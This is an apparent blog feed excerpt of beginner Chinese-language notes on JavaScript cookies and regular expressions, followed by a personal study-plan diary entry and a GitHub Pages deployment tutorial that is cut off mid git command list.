<h4 id="读取cookie"><a href="#读取cookie" class="headerlink" title="读取cookie"></a>读取cookie</h4><ul>
<li>字符串分割</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">function getCookie(name)</div><div class="line">&#123;</div><div class="line">	var arr=document.cookie.split(&apos;; &apos;);</div><div class="line">	</div><div class="line">	for(var i=0;i&lt;arr.length;i++)</div><div class="line">	&#123;</div><div class="line">		var arr2=arr[i].split(&apos;=&apos;);</div><div class="line">		</div><div class="line">		if(arr2[0]==name)</div><div class="line">		&#123;</div><div class="line">			return arr2[1];</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	return &apos;&apos;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="删除cookie"><a href="#删除cookie" class="headerlink" title="删除cookie"></a>删除cookie</h4><ul>
<li>已经过期</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">function removeCookie(name)</div><div class="line">&#123;</div><div class="line">	setCookie(name, 1, -1);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="封装函数-1"><a href="#封装函数-1" class="headerlink" title="封装函数"></a>封装函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">function setCookie(name, value, iDay)</div><div class="line">&#123;</div><div class="line">	var oDate=new Date();</div><div class="line">	oDate.setDate(oDate.getDate()+iDay);</div><div class="line">	</div><div class="line">	document.cookie=name+&apos;=&apos;+value+&apos;;expires=&apos;+oDate;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function getCookie(name)</div><div class="line">&#123;</div><div class="line">	var arr=document.cookie.split(&apos;; &apos;);</div><div class="line">	</div><div class="line">	for(var i=0;i&lt;arr.length;i++)</div><div class="line">	&#123;</div><div class="line">		var arr2=arr[i].split(&apos;=&apos;);</div><div class="line">		</div><div class="line">		if(arr2[0]==name)</div><div class="line">		&#123;</div><div class="line">			return arr2[1];</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	return &apos;&apos;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function removeCookie(name)</div><div class="line">&#123;</div><div class="line">	setCookie(name, 1, -1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">/*setCookie(&apos;userName&apos;, &apos;dancingblue&apos;, 365);</div><div class="line">setCookie(&apos;password&apos;, &apos;123456&apos;, 14);*/</div><div class="line"></div><div class="line">//alert(document.cookie);</div><div class="line">//alert(getCookie(&apos;sex&apos;));</div><div class="line">removeCookie(&apos;password&apos;);</div><div class="line">alert(document.cookie);</div></pre></td></tr></table></figure>
<h2 id="使用cookie-2"><a href="#使用cookie-2" class="headerlink" title="使用cookie - 2"></a>使用cookie - 2</h2><h3 id="cookie的使用-1"><a href="#cookie的使用-1" class="headerlink" title="cookie的使用"></a>cookie的使用</h3><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>用cookie记录上次登录的用户名</p>
<ul>
<li>提交时——记录用户名</li>
<li>window.onload——读取用户名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">function setCookie(name, value, iDay)</div><div class="line">&#123;</div><div class="line">	var oDate=new Date();</div><div class="line">	oDate.setDate(oDate.getDate()+iDay);</div><div class="line">	</div><div class="line">	document.cookie=name+&apos;=&apos;+value+&apos;;expires=&apos;+oDate;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function getCookie(name)</div><div class="line">&#123;</div><div class="line">	var arr=document.cookie.split(&apos;; &apos;);</div><div class="line">	</div><div class="line">	for(var i=0;i&lt;arr.length;i++)</div><div class="line">	&#123;</div><div class="line">		var arr2=arr[i].split(&apos;=&apos;);</div><div class="line">		</div><div class="line">		if(arr2[0]==name)</div><div class="line">		&#123;</div><div class="line">			return arr2[1];</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	return &apos;&apos;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function removeCookie(name)</div><div class="line">&#123;</div><div class="line">	setCookie(name, 1, -1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oForm=document.getElementById(&apos;form1&apos;);</div><div class="line">	var oUser=document.getElementsByName(&apos;user&apos;)[0];</div><div class="line">	</div><div class="line">	oForm.onsubmit=function ()</div><div class="line">	&#123;</div><div class="line">		setCookie(&apos;user&apos;, oUser.value, 14);</div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	oUser.value=getCookie(&apos;user&apos;);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&lt;1form id=&quot;form1&quot; action=&quot;http://www.zhinengshe.com/&quot;&gt;</div><div class="line">	用户名：&lt;input type=&quot;text&quot; name=&quot;user&quot; /&gt;&lt;br&gt;</div><div class="line">    密码：&lt;input type=&quot;password&quot; name=&quot;pass&quot; /&gt;&lt;br&gt;</div><div class="line">	&lt;input type=&quot;submit&quot; value=&quot;登陆&quot; /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure>
<h1 id="JS中的正则表达式"><a href="#JS中的正则表达式" class="headerlink" title="JS中的正则表达式"></a>JS中的正则表达式</h1><h2 id="正则表达式基础-1"><a href="#正则表达式基础-1" class="headerlink" title="正则表达式基础 - 1"></a>正则表达式基础 - 1</h2><h3 id="复习字符串操作"><a href="#复习字符串操作" class="headerlink" title="复习字符串操作"></a>复习字符串操作</h3><ul>
<li>search            查找</li>
<li>substring        获取子字符串</li>
<li>charAt            获取某个字符</li>
<li>split            分割字符串，获得数组</li>
</ul>
<h4 id="search"><a href="#search" class="headerlink" title="search"></a>search</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var str=&apos;abcdef&apos;;</div><div class="line"></div><div class="line">alert(str.search(&apos;u&apos;));		//位置, -1</div></pre></td></tr></table></figure>
<h4 id="substring"><a href="#substring" class="headerlink" title="substring"></a>substring</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var str=&apos;abcdef&apos;;</div><div class="line"></div><div class="line">//alert(str.substring(2, 5));	//不包括结束位置</div><div class="line">alert(str.substring(1));</div></pre></td></tr></table></figure>
<h4 id="charAt"><a href="#charAt" class="headerlink" title="charAt"></a>charAt</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var str=&apos;abcdef&apos;;</div><div class="line"></div><div class="line">alert(str.charAt(0));</div></pre></td></tr></table></figure>
<h3 id="split"><a href="#split" class="headerlink" title="split"></a>split</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var str=&apos;12-56-aaa-89&apos;;</div><div class="line">var arr=str.split(&apos;-&apos;);</div><div class="line"></div><div class="line">alert(arr)</div></pre></td></tr></table></figure>
<h3 id="找出字符串中的所有数字"><a href="#找出字符串中的所有数字" class="headerlink" title="找出字符串中的所有数字"></a>找出字符串中的所有数字</h3><ul>
<li>用传统字符串操作完成</li>
<li>用正则表达式完成</li>
</ul>
<h4 id="传统操作"><a href="#传统操作" class="headerlink" title="传统操作"></a>传统操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">var str=&apos;12 fff 87 er334 233 -=-=fa80&apos;;</div><div class="line">var arr=[];</div><div class="line">var tmp=&apos;&apos;;</div><div class="line"></div><div class="line">for(var i=0;i&lt;str.length;i++)</div><div class="line">&#123;</div><div class="line">	if(str.charAt(i)&gt;=&apos;0&apos; &amp;&amp; str.charAt(i)&lt;=&apos;9&apos;)</div><div class="line">	&#123;</div><div class="line">		tmp+=str.charAt(i);</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		if(tmp)</div><div class="line">		&#123;</div><div class="line">			arr.push(tmp);</div><div class="line">			tmp=&apos;&apos;;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if(tmp)</div><div class="line">&#123;</div><div class="line">	arr.push(tmp);</div><div class="line">	tmp=&apos;&apos;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">alert(arr);</div></pre></td></tr></table></figure>
<h4 id="正则操作"><a href="#正则操作" class="headerlink" title="正则操作"></a>正则操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var str=&apos;12 fff 87 er334 233 -=-=fa80&apos;;</div><div class="line"></div><div class="line">alert(str.match(/\d+/g));</div></pre></td></tr></table></figure>
<h2 id="正则表达式基础-2"><a href="#正则表达式基础-2" class="headerlink" title="正则表达式基础 - 2"></a>正则表达式基础 - 2</h2><h3 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式"></a>什么是正则表达式</h3><ul>
<li>什么叫“正则”<br> 规则、模式</li>
<li>强大的字符串匹配工具</li>
<li>是一种正常人类很难读懂的文字</li>
<li>RegExp对象<br> JS风格——new RegExp(“a”, “i”)<br> perl风格——/a/i</li>
</ul>
<h4 id="JS风格"><a href="#JS风格" class="headerlink" title="JS风格"></a>JS风格</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var re=new RegExp(&apos;b&apos;, &apos;i&apos;);  //i 忽略大小写</div><div class="line">var str=&apos;abcdef&apos;;</div><div class="line"></div><div class="line">alert(str.search(re));</div></pre></td></tr></table></figure>
<h4 id="perl风格"><a href="#perl风格" class="headerlink" title="perl风格"></a>perl风格</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var re=/a/i;</div><div class="line">var str=&apos;abcdef&apos;;</div><div class="line"></div><div class="line">alert(str.search(re));</div></pre></td></tr></table></figure>
<h2 id="字符串与正则配合-1"><a href="#字符串与正则配合-1" class="headerlink" title="字符串与正则配合 - 1"></a>字符串与正则配合 - 1</h2><h3 id="search-1"><a href="#search-1" class="headerlink" title="search"></a>search</h3><h4 id="字符串搜索"><a href="#字符串搜索" class="headerlink" title="字符串搜索"></a>字符串搜索</h4><ul>
<li>返回出现的位置</li>
<li>忽略大小写：i——ignore</li>
<li>判断浏览器类型</li>
</ul>
<h3 id="match"><a href="#match" class="headerlink" title="match"></a>match</h3><h3 id="获取匹配的项目"><a href="#获取匹配的项目" class="headerlink" title="获取匹配的项目"></a>获取匹配的项目</h3><ul>
<li>量词：+</li>
<li>量词变化：\d、\d\d和\d+</li>
<li>全局匹配：g——global</li>
<li>例子：找出所有数字</li>
</ul>
<h4 id="例子：找出所有数字"><a href="#例子：找出所有数字" class="headerlink" title="例子：找出所有数字"></a>例子：找出所有数字</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var str=&apos;asdf 34 656 cvs33&apos;;</div><div class="line">var re=/\d+/g;</div><div class="line"></div><div class="line">alert(str.match(re));</div></pre></td></tr></table></figure>
<h2 id="字符串与正则配合-2"><a href="#字符串与正则配合-2" class="headerlink" title="字符串与正则配合 - 2"></a>字符串与正则配合 - 2</h2><h3 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h3><h4 id="替换所有匹配"><a href="#替换所有匹配" class="headerlink" title="替换所有匹配"></a>替换所有匹配</h4><ul>
<li>返回替换后的字符串</li>
<li>例子：敏感词过滤<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var str=&apos;abc aaa erw&apos;;</div><div class="line">var re=/a/g;</div><div class="line"></div><div class="line">alert(str.replace(re, &apos;0&apos;));</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="字符串-1"><a href="#字符串-1" class="headerlink" title="字符串 - 1"></a>字符串 - 1</h2><h3 id="任意字符"><a href="#任意字符" class="headerlink" title="任意字符"></a>任意字符</h3><ul>
<li>[abc]    或<br> 例子：o[usb]t——obt、ost、out</li>
</ul>
<h3 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h3><ul>
<li>[a-z]、[0-9]<br>  例子：id[0-9]——id0、id5</li>
</ul>
<h3 id="排除"><a href="#排除" class="headerlink" title="排除"></a>排除</h3><ul>
<li>[^a]<br>   例子：o[^0-9]t——oat、o?t、o t</li>
</ul>
<h2 id="字符串-2"><a href="#字符串-2" class="headerlink" title="字符串 - 2"></a>字符串 - 2</h2><h3 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h3><ul>
<li>[a-z0-9A-Z]</li>
</ul>
<h3 id="实例：偷小说"><a href="#实例：偷小说" class="headerlink" title="实例：偷小说"></a>实例：偷小说</h3><ul>
<li>过滤HTML标签<br>   自定义innerText方法<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oTxt1=document.getElementById(&apos;txt1&apos;);</div><div class="line">	var oTxt2=document.getElementById(&apos;txt2&apos;);</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		var re=/&lt;[^&lt;&gt;]+&gt;/g;</div><div class="line">		</div><div class="line">		oTxt2.value=oTxt1.value.replace(re, &apos;&apos;);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"></div><div class="line">&lt;textarea id=&quot;txt1&quot; rows=&quot;10&quot; cols=&quot;40&quot;&gt;&lt;/textarea&gt;&lt;br&gt;</div><div class="line">&lt;input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;转换&quot; /&gt;&lt;br&gt;</div><div class="line">&lt;textarea id=&quot;txt2&quot; rows=&quot;10&quot; cols=&quot;40&quot;&gt;&lt;/textarea&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><ul>
<li>.（点）——任意字符</li>
<li>\d(数字)、\w(英文、数字、下划线)、\s(空白字符)      </li>
<li>\D(除了数字)、\W(除了英文、数字、下划线)、\S(除了空白字符)</li>
</ul>
<h2 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h2><h3 id="什么是量词"><a href="#什么是量词" class="headerlink" title="什么是量词"></a>什么是量词</h3><ul>
<li>{n}出现的次数</li>
<li>{n,m}，至少出现n次，最多m次</li>
<li>{n，}  最少n次，最多不限</li>
<li>例子：查找QQ号  [1-9]\d{4,10}</li>
<li>例子：固定电话    (0\d{2,3}-)?[1-9]\d{7}   ?表示前面可以有可以没有</li>
</ul>
<h3 id="常用量词"><a href="#常用量词" class="headerlink" title="常用量词"></a>常用量词</h3><ul>
<li>{n,}    至少n次</li>
<li>×        任意次    {0,}</li>
<li>？    零次或一次    {0,1}</li>
<li>＋    一次或任意次{1,}</li>
<li>{n}    正好n次</li>
</ul>
<h2 id="常用正则例子"><a href="#常用正则例子" class="headerlink" title="常用正则例子"></a>常用正则例子</h2><h3 id="表单校验实例"><a href="#表单校验实例" class="headerlink" title="表单校验实例"></a>表单校验实例</h3><ul>
<li>校验邮箱<br>   行首(^)、行尾($)</li>
<li>test 只要一部分符合要求就返回ture        </li>
</ul>
<pre><code>window.onload=function ()
{
    var oTxt=document.getElementById(&apos;txt1&apos;);
    var oBtn=document.getElementById(&apos;btn1&apos;);

    oBtn.onclick=function ()
    {
        var re=/^\w+@[a-z0-9]+\.[a-z]+$/i;

        if(re.test(oTxt.value))
        {
            alert(&apos;合法的邮箱&apos;);
        }
        else
        {
            alert(&apos;你丫写错了&apos;);
        }
    };
};


&lt;1input type=&quot;text&quot; id=&quot;txt1&quot; /&gt;
&lt;1input type=&quot;button&quot; value=&quot;校验&quot; id=&quot;btn1&quot; /&gt;
</code></pre>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[2016-10-19]]></title>
      <url>http://uknowsec.cn/posts/life/2016-10-19.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>距上次写博客差不多20多天了，最近也是挺忙的。没时间写博客，专业作业，另外还有的安排、研究院的小组学习任务。没有怎么更新。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>最近在给自己养成一些好的习惯吧！前段时间作息时间有点乱，然后就是作息时间乱，引起各种病痛，缺少体育锻炼吧！尽量早点睡觉，早点起床吧！另外就是学校的学习和自己的个人的学习问题了，感觉很冲突，来不及转换。专业学习的任务还是有这么重的，但是再怎么也不会丢下自己的个人学习。JavaScript还是要在计划中学完吧，然后再自己搞几个小项目实践下。这几天每次去图书馆都屁颠屁颠的往新书架跑，看我荐购的图书有没有上架。可是每次都没上，这是最骚。然后就是下次来了再看看吧。再给自己定一个小小的计划吧！</p>
<table>
<thead>
<tr>
<th>事件</th>
</tr>
</thead>
<tbody>
<tr>
<td>学校作业</td>
</tr>
<tr>
<td>每日敲几个C++书上的例题</td>
</tr>
<tr>
<td>记英语单词</td>
</tr>
<tr>
<td>偶尔跟同学去下跑跑步</td>
</tr>
<tr>
<td>JavaScript学习</td>
</tr>
</tbody>
</table>
<p>这些就是这段时间的计划了吧，体育锻炼什么的还是要有的。另外不能落下的就不落下吧。</p>
<p>我经常和同学和朋友说，我不想这四年就这么混过去。用我爸的话就是：如果你要混，那就早点放弃。别浪费时间和金钱。这个观念之前没有在意的。但是到了大学，我却把这句话牢牢的记在了心里。我不想这四年就这么白白的混过去，大学并不是之前高中老师曾经说的大学就解放了。混四年，毕业找不到工作，回家啃老？我并不想以后这样。如果我觉得我真的读这四年以后找不到工作，没有什么用处的话，我是真的会选择放弃。所以，现在好好的做好自己，把自己计划的事，自己感兴趣的事情一直进行下去，莫负韵华。</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>以此给自己一个提醒，做好自己！</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20161019235139.jpg" alt=""></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[如何在Github Pages搭建自己写的页面？]]></title>
      <url>http://uknowsec.cn/posts/skill/%E5%A6%82%E4%BD%95%E5%9C%A8Github-Pages%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%9F.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<p>学了前端小半年，如今写了个自己的网页想要去应聘，却发现部署很麻烦，部署到阿里云之类，买域名啊啥的还要收费，说贵也不贵，但我就是傲娇~</p>
<p>google一下了解到Github有一个Github pages的功能可以搭建博客或者托管网页，而且免费耶，搜了下教程，猛地一看感觉步骤也不是很麻烦，所以就用这个了！</p>
<p>教程一大堆，却没有几个能看懂的，问题一：90%的都在讲解如何搭建博客，和我想要将自己的网页部署到上面还是有点区别的。问题二：所有的教程都用到了Git，而我只知道Git是一个开源的分布式版本控制系统。完全不知道命令行是什么鬼，只能照猫画虎的小白来说，那些教程只能帮我到桥头，但想要成功过河，还需要深夜里的一包特浓咖啡。 </p>
<p>开始教程之前的准备工作：</p>
<p>需要你自己写的网页文件。</p>
<p><a href="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305135133440-1617205021.png" target="_blank" rel="external"></a></p>
<p>注册Github。</p>
<p>下载安装git。<a href="https://git-scm.com/downloads" target="_blank" rel="external">下载地址</a></p>
<h2 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h2><h3 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h3><p>登录到Github上，新建一个repo，命名为test，勾选 initialize this repository with a README，点击create repository。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305134947346-1921005167.png" alt=""></p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305135528627-97762586.png" alt=""></p>
<h3 id="步骤二"><a href="#步骤二" class="headerlink" title="步骤二"></a>步骤二</h3><p>打开settings，有一个Github Pages 的设置，点击Launch automatic page generator（启动自动页面生成器）</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305140204096-424861698.png" alt=""></p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305140522830-7799375.png" alt=""></p>
<h3 id="步骤三"><a href="#步骤三" class="headerlink" title="步骤三"></a>步骤三</h3><p>点击页面最后的continue to layouts，然后就可以进入设置你的页面主题，你会说这不是我的网页呀，别急嘛，先选择一个主题，点击 publish pages。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305141007221-1678443414.png" alt=""></p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305141341080-929861094.png" alt=""></p>
<p>这个时候会出现你的网页的网址，也就是下图的 <a href="http://jiayili.github.io/test复制打开这个网址，你看到了什么？" target="_blank" rel="external">http://jiayili.github.io/test复制打开这个网址，你看到了什么？</a></p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305141706065-643882140.png" alt=""></p>
<p>哇塞，这不是刚自己设置选择的主题页面吗？</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305141935393-1254718979.png" alt=""></p>
<p>好了，别激动了，真正让一个小白你发疯的阶段开始了，有了自己的网址，但页面显示的是什么鬼？</p>
<p>至此以上，github上要处理的操作告一段落，该上Git了！</p>
<h3 id="步骤四"><a href="#步骤四" class="headerlink" title="步骤四"></a>步骤四</h3><p>打开此电脑，选择一个盘，比如 f 盘，右键空白处点击 git bash here。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305143603580-1181123251.png" alt=""></p>
<h3 id="步骤五"><a href="#步骤五" class="headerlink" title="步骤五"></a>步骤五</h3><p>输入如下命令，用来在 f 盘创建 test 文件放你的github上的test repository，克隆test repository到 test 文件中。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305144226284-240519711.png" alt=""></p>
<p>这个时候你的 f 盘，就会多一个 test 文件，打开它，</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305144422830-1748939517.png" alt=""></p>
<p>会看到一个 README.md 的文件，这个文件是从哪来的呢？追溯到gihub上，你会发现你有两个分支（branches），而 README 文件是来自 master 分支。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305144809455-1559494911.png" alt=""></p>
<p>而我们需要编辑的是另一个分支&mdash;&mdash;gh-pages，因为这个分支才能够真正定义github pages的内容和样式，也就是可以呈现你网页的地方。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305145219659-1397982425.png" alt=""></p>
<h3 id="步骤六"><a href="#步骤六" class="headerlink" title="步骤六"></a>步骤六</h3><p>输入以下命令，为了在本地新建一个gh-pages分支，而这个分支是远程分支origin/gh-pages的镜像，也就是我们可以在本地的gh-pages看到github上的gh-pages的内容。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305145815252-344194499.png" alt=""></p>
<p>这个时候我们再打开 f 盘，发现变样了</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305145931096-1818738887.png" alt=""></p>
<p>刚才还是README呢，怎们现在成了3个文件了，这3个文件来自哪？</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305150144159-905298121.png" alt=""></p>
<p>来自github 上的 gh-pages 分支下的文件。</p>
<p>打开f 盘中的 index.html，你会发现就是咱们一开始选择主题的页面。那我们将这个页面替换成自己coding的网页不就好了？</p>
<h3 id="步骤七"><a href="#步骤七" class="headerlink" title="步骤七"></a>步骤七</h3><p>执行如下命令，删除原有的gh-pages文件，并提交（commit）本次修改。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305150641830-12563151.png" alt=""></p>
<p>这个时候 f 盘没有文件。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305151026377-702293659.png" alt=""></p>
<h3 id="步骤八"><a href="#步骤八" class="headerlink" title="步骤八"></a>步骤八</h3><p>将自己的网页文件复制粘贴至 f 盘的 test 文件中 </p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305151236221-872410232.png" alt=""></p>
<p>输入如下命令，为了本地gh-pages中的网页文件同步到远程的gh-pages中。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305151516534-175124906.png" alt=""><br><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305151717159-2121860532.png" alt=""></p>
<p>输入最后一行 git push origin gh-pages，按回车，等一会，会有弹出框让你输入你的 github 账号和密码。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305152031768-1166232109.png" alt=""></p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305152052471-1604781690.png" alt=""></p>
<p>ok之后耐心等待。</p>
<p>当出现像下图中的命令行之后，你已经完成了99%。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305152406221-11660909.png" alt=""></p>
<h3 id="最后一步"><a href="#最后一步" class="headerlink" title="最后一步"></a>最后一步</h3><p>打开浏览器输入给你的网址加上 test.html，然后重重的按下回车。</p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305152916580-99607842.png" alt=""></p>
<p><img src="http://images2015.cnblogs.com/blog/903320/201603/903320-20160305153305424-1042365035.png" alt="">恭喜你，成功了！！！哦不，还差一步，不评论关注一下我？</p>
<h2 id="附录一"><a href="#附录一" class="headerlink" title="附录一"></a>附录一</h2><p>常用git命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$ git clone&amp;nbsp;&amp;nbsp;//本地如果无远程代码，先做这步，不然就忽略 </div><div class="line"></div><div class="line">$ cd //定位到你blog的目录下 </div><div class="line"></div><div class="line">$ git status //查看本地自己修改了多少文件 </div><div class="line"></div><div class="line">$ git add . //添加远程不存在的git文件 </div><div class="line"></div><div class="line">$ git commit &amp;nbsp;-m &quot;what I want told to someone&quot; //提交修改 </div><div class="line"></div><div class="line">$ git push 